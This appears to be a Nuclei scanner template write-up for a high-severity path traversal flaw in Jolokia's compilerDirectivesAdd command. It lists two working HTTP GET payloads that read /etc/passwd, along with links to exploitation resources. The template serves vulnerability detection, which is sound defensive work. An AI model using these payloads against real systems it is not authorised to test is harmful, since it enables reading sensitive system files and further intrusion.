# Nuclei Template: Jolokia - CompilerDirectivesAdd File Read
**Template ID:** jolokia-file-read-compilerdirectivesadd
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`jolokia-file-read-compilerdirectivesadd.yaml`)

## Vulnerability Information & PoC

## Description
Jolokia is vulnerable to local file inclusion via compilerDirectivesAdd.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
GET {{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
```

## References
- https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/
- https://github.com/laluka/jolokia-exploitation-toolkit
